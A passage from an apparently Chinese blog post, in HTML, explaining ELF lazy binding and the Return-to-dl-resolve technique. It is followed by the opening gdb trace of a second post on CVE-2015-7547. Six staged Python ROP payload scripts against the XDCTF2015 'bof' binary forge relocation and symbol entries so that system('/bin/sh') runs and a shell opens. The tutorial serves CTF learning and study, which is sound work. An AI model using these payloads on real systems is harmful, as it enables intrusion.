Elf32_Sym;</span><br></pre></td></tr></table></figure></p>
<p>如图，<code>write</code>的索引值为<code>ELF32_R_SYM(0x507) = 0x507 &gt;&gt; 8 = 5</code>。而<code>Elf32_Sym[5]</code>即保存着<code>write</code>的符号表信息。并且<code>ELF32_R_TYPE(0x507) = 7</code>,对应<code>R_386_JUMP_SLOT</code><br><img src="/images/Return-to-dl-resolve/1459409118762.png" alt="Alt text"></p>
<p>（4）其中<code>.dynstr</code>节包含了动态链接的字符串。这个节区以<code>\x00</code>作为开始和结尾，中间每个字符串也以<code>\x00</code>间隔。如图，<code>Elf32_Sym[5]-&gt;st_name = 0x54</code>,所以<code>.dynstr</code>加上<code>0x54</code>的偏移量，就是字符串<code>write</code><br><img src="/images/Return-to-dl-resolve/1459414521835.png" alt="Alt text"></p>
<p>（5）其中<code>.plt</code>节是过程链接表。过程链接表把位置独立的函数调用重定向到绝对位置。如图，当程序执行<code>call write@plt</code>时，实际会跳到<code>0x80483c0</code>去执行。<br><img src="/images/Return-to-dl-resolve/1459415839271.png" alt="Alt text"></p>
<h5 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h5><p>程序在执行的过程中，可能引入的有些C库函数到结束时都不会执行。所以ELF采用延迟绑定的技术，在第一次调用C库函数是时才会去寻找真正的位置进行绑定。</p>
<p>具体来说，在前一部分我们已经知道，当程序执行<code>call write@plt</code>时，实际会跳到<code>0x80483c0</code>去执行。而<code>0x80483c0</code>处的汇编代码仅仅三行。我们来看一下这三行代码做了什么。<br><img src="/images/Return-to-dl-resolve/1459415839271.png" alt="Alt text"><br>第一行，上一部分也提到了<code>0x804a010</code>是<code>write</code>的GOT表位置，当我们第一次调用<code>write</code>时，其对应的GOT表里并没有存放<code>write</code>的真实地址，而是下一条指令的地址。第二、三行，把<code>reloc_arg=0x20</code>作为参数推入栈中，跳到<code>0x8048370</code>继续执行。<br><img src="/images/Return-to-dl-resolve/1459417176752.png" alt="Alt text"></p>
<p><code>0x8048370</code>再把<code>link_map = *(GOT+4)</code>作为参数推入栈中，而<code>*(GOT+8)</code>中保存的是<code>_dl_runtime_resolve</code>函数的地址。因此以上指令相当于执行了<code>_dl_runtime_resolve(link_map, reloc_arg)</code>，该函数会完成符号的解析，即将真实的<code>write</code>函数地址写入其<code>GOT</code>条目中，随后把控制权交给<code>write</code>函数。<br><img src="/images/Return-to-dl-resolve/1459417932071.png" alt="Alt text"></p>
<p>其中<code>_dl_runtime_resolve</code>是在<code>glibc-2.22/sysdeps/i386/dl-trampoline.S</code>中用汇编实现的。<code>0xf7ff04fb</code>处即调用<code>_dl_fixup</code>，并且通过寄存器传参。<br><img src="/images/Return-to-dl-resolve/1459425491545.png" alt="Alt text"></p>
<p>其中<code>_dl_fixup</code>是在<code>glibc-2.22/elf/dl-runtime.c</code>实现的，我们只关注一些主要函数。<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (<span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>, <span class="title">ElfW</span>(<span class="title">Word</span>) <span class="title">reloc_arg</span>)</span></span><br></pre></td></tr></table></figure></p>
<p>首先通过参数<code>reloc_arg</code>计算重定位入口，这里的<code>JMPREL</code>即<code>.rel.plt</code>，<code>reloc_offset</code>即<code>reloc_arg</code>。<br><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_J<span class="built_in">MPREL</span>]) + reloc_offset);</span><br></pre></td></tr></table></figure></p>
<p>然后通过<code>reloc-&gt;r_info</code>找到<code>.dynsym</code>中对应的条目。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br></pre></td></tr></table></figure></p>
<p>这里还会检查<code>reloc-&gt;r_info</code>的最低位是不是<code>R_386_JUMP_SLOT=7</code><br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert (<span class="name">ELFW</span>(<span class="name">R_TYPE</span>)(<span class="name">reloc-&gt;r_info</span>) == ELF_MACHINE_JMP_SLOT)<span class="comment">;</span></span><br></pre></td></tr></table></figure></p>
<p>接着通过<code>strtab + sym-&gt;st_name</code>找到符号表字符串，<code>result</code>为libc基地址<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">result</span> = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,version, <span class="type">ELF_RTYPE_CLASS_PLT</span>, flags, <span class="type">NULL</span>);</span><br></pre></td></tr></table></figure></p>
<p><code>value</code>为libc基址加上要解析函数的偏移地址，也即实际地址。<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value = <span class="type">DL_FIXUP_MAKE_VALUE</span> (<span class="literal">result</span>, sym ? (<span class="type">LOOKUP_VALUE_ADDRESS</span> (<span class="literal">result</span>) + sym-&gt;st_value) : <span class="number">0</span>);</span><br></pre></td></tr></table></figure></p>
<p>最后把<code>value</code>写入相应的GOT表条目中<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> elf_machine_fixup_plt (l, <span class="literal">result</span>, reloc, rel_addr, value);</span><br></pre></td></tr></table></figure></p>
<h4 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h4><ol>
<li>控制EIP为PLT[0]的地址，只需传递一个<code>index_arg</code>参数</li>
<li>控制<code>index_arg</code>的大小，使<code>reloc</code>的位置落在可控地址内</li>
<li>伪造<code>reloc</code>的内容，使<code>sym</code>落在可控地址内</li>
<li>伪造<code>sym</code>的内容，使<code>name</code>落在可控地址内</li>
<li>伪造<code>name</code>为任意库函数，如<code>system</code></li>
</ol>
<h5 id="控制EIP"><a href="#控制EIP" class="headerlink" title="控制EIP"></a>控制EIP</h5><p>首先确认一下进程当前开了哪些保护<br><img src="/images/Return-to-dl-resolve/1459398186541.png" alt="Alt text"></p>
<p>由于程序存在栈缓冲区漏洞，我们可以用PEDA很快定位覆写EIP的位置。</p>
<p><img src="/images/Return-to-dl-resolve/1459398079809.png" alt="Alt text"></p>
<h5 id="stage1"><a href="#stage1" class="headerlink" title="stage1"></a>stage1</h5><p>我们先写一个ROP链，直接返回到<code>write@plt</code><br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">from zio import *</span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">addr_plt_read </span> = <span class="number">0x08048390</span>   <span class="comment"># objdump -d -j.plt bof | grep "read"</span></span><br><span class="line"><span class="keyword">addr_plt_write </span>= <span class="number">0x080483c0</span>   <span class="comment"># objdump -d -j.plt bof | grep "write"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#./rp-lin-x86  --file=bof --rop=3 --unique &gt; gadgets.txt</span></span><br><span class="line">pppop_ret = <span class="number">0x0804856c</span></span><br><span class="line">pop_ebp_ret   =  <span class="number">0x08048453</span></span><br><span class="line">leave_ret = <span class="number">0x08048481</span></span><br><span class="line"></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line"><span class="keyword">addr_bss </span>  = <span class="number">0x0804a020</span>   <span class="comment"># readelf -S bof | grep ".bss"</span></span><br><span class="line"><span class="keyword">base_stage </span>= <span class="keyword">addr_bss </span>+ stack_size</span><br><span class="line"></span><br><span class="line">target = <span class="string">"./bof"</span></span><br><span class="line">io   = zio((target))</span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line"><span class="comment"># io.gdb_hint([0x80484bd])</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">buf1 </span> = <span class="string">'A'</span> * offset</span><br><span class="line"><span class="keyword">buf1 </span>+= l32(<span class="keyword">addr_plt_read)</span><br><span class="line"></span><span class="keyword">buf1 </span>+= l32(pppop_ret)</span><br><span class="line"><span class="keyword">buf1 </span>+= l32(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">buf1 </span>+= l32(<span class="keyword">base_stage)</span><br><span class="line"></span><span class="keyword">buf1 </span>+= l32(<span class="number">100</span>)</span><br><span class="line"><span class="keyword">buf1 </span>+= l32(pop_ebp_ret)</span><br><span class="line"><span class="keyword">buf1 </span>+= l32(<span class="keyword">base_stage)</span><br><span class="line"></span><span class="keyword">buf1 </span>+= l32(leave_ret)</span><br><span class="line">io.writeline(<span class="keyword">buf1)</span><br><span class="line"></span></span><br><span class="line">cmd = <span class="string">"/bin/sh"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">buf2 </span>= <span class="string">'AAAA'</span></span><br><span class="line"><span class="keyword">buf2 </span>+= l32(<span class="keyword">addr_plt_write)</span><br><span class="line"></span><span class="keyword">buf2 </span>+= <span class="string">'AAAA'</span></span><br><span class="line"><span class="keyword">buf2 </span>+= l32(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">buf2 </span>+= l32(<span class="keyword">base_stage+80)</span><br><span class="line"></span><span class="keyword">buf2 </span>+= l32(len(cmd))</span><br><span class="line"><span class="keyword">buf2 </span>+= <span class="string">'A'</span> * (<span class="number">80</span>-len(<span class="keyword">buf2))</span><br><span class="line"></span><span class="keyword">buf2 </span>+= cmd + <span class="string">'\x00'</span></span><br><span class="line"><span class="keyword">buf2 </span>+= <span class="string">'A'</span> * (<span class="number">100</span>-len(<span class="keyword">buf2))</span><br><span class="line"></span>io.writeline(<span class="keyword">buf2)</span><br><span class="line"></span>io.interact()</span><br></pre></td></tr></table></figure></p>
<p>最后会把我们输入的<code>cmd</code>打印出来<br><img src="/images/Return-to-dl-resolve/1459438836360.png" alt="Alt text"></p>
<h5 id="stage2"><a href="#stage2" class="headerlink" title="stage2"></a>stage2</h5><p>这次我们控制EIP返回到<code>PLT0</code>，要带上<code>index_offset</code>。这里我们修改一下<code>buf2</code><br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">...</span></span><br><span class="line"><span class="symbol">cmd</span> = <span class="string">"/bin/sh"</span></span><br><span class="line"><span class="keyword">addr_plt_start </span>= <span class="number">0x8048370</span> # objdump -d -j.plt <span class="keyword">bof</span><br><span class="line"></span><span class="symbol">index_offset</span>   = <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">buf2 </span>= <span class="string">'AAAA'</span></span><br><span class="line"><span class="keyword">buf2 </span>+= l32(<span class="keyword">addr_plt_start)</span><br><span class="line"></span><span class="keyword">buf2 </span>+= l32(index_offset)</span><br><span class="line"><span class="keyword">buf2 </span>+= <span class="string">'AAAA'</span></span><br><span class="line"><span class="keyword">buf2 </span>+= l32(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">buf2 </span>+= l32(<span class="keyword">base_stage+80)</span><br><span class="line"></span><span class="keyword">buf2 </span>+= l32(len(cmd))</span><br><span class="line"><span class="keyword">buf2 </span>+= <span class="string">'A'</span> * (<span class="number">80</span>-len(<span class="keyword">buf2))</span><br><span class="line"></span><span class="keyword">buf2 </span>+= cmd + <span class="string">'\x00'</span></span><br><span class="line"><span class="keyword">buf2 </span>+= <span class="string">'A'</span> * (<span class="number">100</span>-len(<span class="keyword">buf2))</span><br><span class="line"></span><span class="symbol">io.writeline</span>(<span class="keyword">buf2)</span><br><span class="line"></span><span class="symbol">io.interact</span>()</span><br></pre></td></tr></table></figure></p>
<p>同样会把我们输入的<code>cmd</code>打印出来<br><img src="/images/Return-to-dl-resolve/1459439191206.png" alt="Alt text"></p>
<h5 id="stage3"><a href="#stage3" class="headerlink" title="stage3"></a>stage3</h5><p>这一次我们控制<code>index_offset</code>，使其指向我们伪造的<code>fake_reloc</code><br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">cmd = <span class="string">"/bin/sh"</span></span><br><span class="line"><span class="keyword">addr_plt_start </span>= <span class="number">0x8048370</span> <span class="comment"># objdump -d -j.plt bof</span></span><br><span class="line"><span class="keyword">addr_rel_plt </span>  = <span class="number">0x8048318</span> <span class="comment"># objdump -s -j.rel.plt a.out</span></span><br><span class="line">index_offset   = (<span class="keyword">base_stage </span>+ <span class="number">28</span>) - <span class="keyword">addr_rel_plt</span><br><span class="line"></span><span class="keyword">addr_got_write </span>= <span class="number">0x804a020</span></span><br><span class="line">r_info         = <span class="number">0x507</span></span><br><span class="line">fake_reloc     = l32(<span class="keyword">addr_got_write) </span>+ l32(r_info)</span><br><span class="line"></span><br><span class="line"><span class="keyword">buf2 </span>= <span class="string">'AAAA'</span></span><br><span class="line"><span class="keyword">buf2 </span>+= l32(<span class="keyword">addr_plt_start)</span><br><span class="line"></span><span class="keyword">buf2 </span>+= l32(index_offset)</span><br><span class="line"><span class="keyword">buf2 </span>+= <span class="string">'AAAA'</span></span><br><span class="line"><span class="keyword">buf2 </span>+= l32(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">buf2 </span>+= l32(<span class="keyword">base_stage+80)</span><br><span class="line"></span><span class="keyword">buf2 </span>+= l32(len(cmd))</span><br><span class="line"><span class="keyword">buf2 </span>+= fake_reloc</span><br><span class="line"><span class="keyword">buf2 </span>+= <span class="string">'A'</span> * (<span class="number">80</span>-len(<span class="keyword">buf2))</span><br><span class="line"></span><span class="keyword">buf2 </span>+= cmd + <span class="string">'\x00'</span></span><br><span class="line"><span class="keyword">buf2 </span>+= <span class="string">'A'</span> * (<span class="number">100</span>-len(<span class="keyword">buf2))</span><br><span class="line"></span>io.writeline(<span class="keyword">buf2)</span><br><span class="line"></span>io.interact()</span><br></pre></td></tr></table></figure></p>
<p>同样会把我们输入的<code>cmd</code>打印出来<br><img src="/images/Return-to-dl-resolve/1459442727696.png" alt="Alt text"></p>
<h5 id="stage4"><a href="#stage4" class="headerlink" title="stage4"></a>stage4</h5><p>这一次我们伪造<code>fake_sym</code>，使其指向我们控制的<code>st_name</code><br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">cmd = "/bin/sh"</span><br><span class="line">addr_plt_start = 0x8048370 # objdump -d -j.plt bof</span><br><span class="line">addr_rel_plt   = 0x8048318 # objdump -s -j.rel.plt a.out</span><br><span class="line">index_offset   = (base_stage + 28) - addr_rel_plt</span><br><span class="line">addr_got_write = 0x804a020</span><br><span class="line">addr_dynsym    = 0x080481d8</span><br><span class="line">addr_dynstr    = 0x08048268</span><br><span class="line">fake_sym       = base_stage + 36</span><br><span class="line">align          = 0x10 - ((fake_sym - addr_dynsym) &amp; 0xf)</span><br><span class="line">fake_sym       = fake_sym + align</span><br><span class="line">index_dynsym   = (fake_sym - addr_dynsym) / 0x10</span><br><span class="line">r_info         = (index_dynsym &lt;&lt; 8 ) | 0x7</span><br><span class="line">fake_reloc     = l32(addr_got_write) + l32(r_info)</span><br><span class="line">st_name        = 0x54</span><br><span class="line">fake_sym       = l32(st_name) + l32(0) + l32(0) + l32(0x12)</span><br><span class="line"></span><br><span class="line">buf2 = 'AAAA'</span><br><span class="line">buf2 += l32(addr_plt_start)</span><br><span class="line">buf2 += l32(index_offset)</span><br><span class="line">buf2 += 'AAAA'</span><br><span class="line">buf2 += l32(1)</span><br><span class="line">buf2 += l32(base_stage+80)</span><br><span class="line">buf2 += l32(len(cmd))</span><br><span class="line">buf2 += fake_reloc</span><br><span class="line">buf2 += 'B' * align</span><br><span class="line">buf2 += fake_sym </span><br><span class="line">buf2 += 'A' * (80-len(buf2))</span><br><span class="line">buf2 += cmd + '\x00'</span><br><span class="line">buf2 += 'A' * (100-len(buf2))</span><br><span class="line">io.writeline(buf2)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure></p>
<p>同样会把我们输入的<code>cmd</code>打印出来<br><img src="/images/Return-to-dl-resolve/1459442523856.png" alt="Alt text"></p>
<h5 id="stage5"><a href="#stage5" class="headerlink" title="stage5"></a>stage5</h5><p>这次把<code>st_name</code>指向我们伪造的字符串<code>write</code><br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">cmd = "/bin/sh"</span><br><span class="line">addr_plt_start = 0x8048370 # objdump -d -j.plt bof</span><br><span class="line">addr_rel_plt   = 0x8048318 # objdump -s -j.rel.plt a.out</span><br><span class="line">index_offset   = (base_stage + 28) - addr_rel_plt</span><br><span class="line">addr_got_write = 0x804a020</span><br><span class="line">addr_dynsym    = 0x080481d8</span><br><span class="line">addr_dynstr    = 0x08048268</span><br><span class="line">addr_fake_sym  = base_stage + 36</span><br><span class="line">align          = 0x10 - ((addr_fake_sym - addr_dynsym) &amp; 0xf)</span><br><span class="line">addr_fake_sym  = addr_fake_sym + align</span><br><span class="line">index_dynsym   = (addr_fake_sym - addr_dynsym) / 0x10</span><br><span class="line">r_info         = (index_dynsym &lt;&lt; 8 ) | 0x7</span><br><span class="line">fake_reloc     = l32(addr_got_write) + l32(r_info)</span><br><span class="line">st_name        = (addr_fake_sym + 16) - addr_dynstr</span><br><span class="line">fake_sym       = l32(st_name) + l32(0) + l32(0) + l32(0x12)</span><br><span class="line"></span><br><span class="line">buf2 = 'AAAA'</span><br><span class="line">buf2 += l32(addr_plt_start)</span><br><span class="line">buf2 += l32(index_offset)</span><br><span class="line">buf2 += 'AAAA'</span><br><span class="line">buf2 += l32(1)</span><br><span class="line">buf2 += l32(base_stage+80)</span><br><span class="line">buf2 += l32(len(cmd))</span><br><span class="line">buf2 += fake_reloc</span><br><span class="line">buf2 += 'B' * align</span><br><span class="line">buf2 += fake_sym</span><br><span class="line">buf2 += "write\x00"</span><br><span class="line">buf2 += 'A' * (80-len(buf2))</span><br><span class="line">buf2 += cmd + '\x00'</span><br><span class="line">buf2 += 'A' * (100-len(buf2))</span><br><span class="line">io.writeline(buf2)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure></p>
<p>同样会把我们输入的<code>cmd</code>打印出来<br><img src="/images/Return-to-dl-resolve/1459442264800.png" alt="Alt text"></p>
<h5 id="stage6"><a href="#stage6" class="headerlink" title="stage6"></a>stage6</h5><p>替换<code>write</code>为<code>system</code>,并修改<code>system</code>的参数<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">cmd = "/bin/sh"</span><br><span class="line">addr_plt_start = 0x8048370 # objdump -d -j.plt bof</span><br><span class="line">addr_rel_plt   = 0x8048318 # objdump -s -j.rel.plt a.out</span><br><span class="line">index_offset   = (base_stage + 28) - addr_rel_plt</span><br><span class="line">addr_got_write = 0x804a020</span><br><span class="line">addr_dynsym    = 0x080481d8</span><br><span class="line">addr_dynstr    = 0x08048268</span><br><span class="line">addr_fake_sym  = base_stage + 36</span><br><span class="line">align          = 0x10 - ((addr_fake_sym - addr_dynsym) &amp; 0xf)</span><br><span class="line">addr_fake_sym  = addr_fake_sym + align</span><br><span class="line">index_dynsym   = (addr_fake_sym - addr_dynsym) / 0x10</span><br><span class="line">r_info         = (index_dynsym &lt;&lt; 8 ) | 0x7</span><br><span class="line">fake_reloc     = l32(addr_got_write) + l32(r_info)</span><br><span class="line">st_name        = (addr_fake_sym + 16) - addr_dynstr</span><br><span class="line">fake_sym       = l32(st_name) + l32(0) + l32(0) + l32(0x12)</span><br><span class="line"></span><br><span class="line">buf2 = 'AAAA'</span><br><span class="line">buf2 += l32(addr_plt_start)</span><br><span class="line">buf2 += l32(index_offset)</span><br><span class="line">buf2 += 'AAAA'</span><br><span class="line">buf2 += l32(base_stage+80)</span><br><span class="line">buf2 += 'aaaa'</span><br><span class="line">buf2 += 'aaaa'</span><br><span class="line">buf2 += fake_reloc</span><br><span class="line">buf2 += 'B' * align</span><br><span class="line">buf2 += fake_sym</span><br><span class="line">buf2 += "system\x00"</span><br><span class="line">buf2 += 'A' * (80-len(buf2))</span><br><span class="line">buf2 += cmd + '\x00'</span><br><span class="line">buf2 += 'A' * (100-len(buf2))</span><br><span class="line">io.writeline(buf2)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure></p>
<p>得到一个<code>shell</code><br><img src="/images/Return-to-dl-resolve/1459442011940.png" alt="Alt text"></p>
<h5 id="WTF"><a href="#WTF" class="headerlink" title="WTF"></a>WTF</h5><p>以上只是叙述原理，当然你比较懒的话，这里已经有成熟的工具辅助编写利用脚本<a href="https://github.com/inaz2/roputils/blob/master/examples/dl-resolve-i386.py" target="_blank" rel="external">roputils</a></p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>【1】<a href="https://sourceware.org/git/?p=glibc.git;a=blob_plain;f=elf/elf.h" target="_blank" rel="external">ELF文件格式</a><br>【2】<a href="http://www.xfocus.net/articles/200201/337.html" target="_blank" rel="external">ELF动态解析符号过程</a><br>【3】<a href="http://angelboy.logdown.com/posts/283218-return-to-dl-resolve" target="_blank" rel="external">Return to dl-resolve</a><br>【4】<a href="http://inaz2.hatenablog.com/entry/2014/07/15/023406" target="_blank" rel="external">ROP stager + Return-to-dl-resolveによるASLR+DEP回避</a><br>【5】<a href="http://rk700.github.io/article/2015/08/09/return-to-dl-resolve" target="_blank" rel="external">Return to dl-resolve</a><br>【6】<a href="http://www.inforsec.org/wp/?p=389" target="_blank" rel="external">通过ELF动态装载机制进行漏洞利用</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="post-CVE-2015-7547" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/03/29/CVE-2015-7547/" class="article-date">
  	<time datetime="2016-03-29T13:03:18.000Z" itemprop="datePublished">2016-03-29</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/03/29/CVE-2015-7547/">CVE-2015-7547</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">=&gt; <span class="number">0x8048573</span> &lt;main+<span class="number">72</span>&gt;:	<span class="keyword">call</span>   <span class="number">0x8048420</span> &lt;getaddrinfo@plt&gt;</span><br><span class="line">=&gt; <span class="number">0xb7ed9c40</span> &lt;__GI_getaddrinfo&gt;:	<span class="keyword">push</span>   <span class="built_in">ebp</span></span><br><span class="line">Breakpoint <span class="number">1</span>, __GI_getaddrinfo (name=<span class="number">0x8048643</span> <span class="string">"bigtang.org"</span>, </span><br><span class="line">    service=<span class="number">0x8048640</span> <span class="string">"22"</span>, hints=<span class="number">0xbffff04c</span>, pai=<span class="number">0xbffff044</span>)</span><br><span class="line">    <span class="meta">at</span> 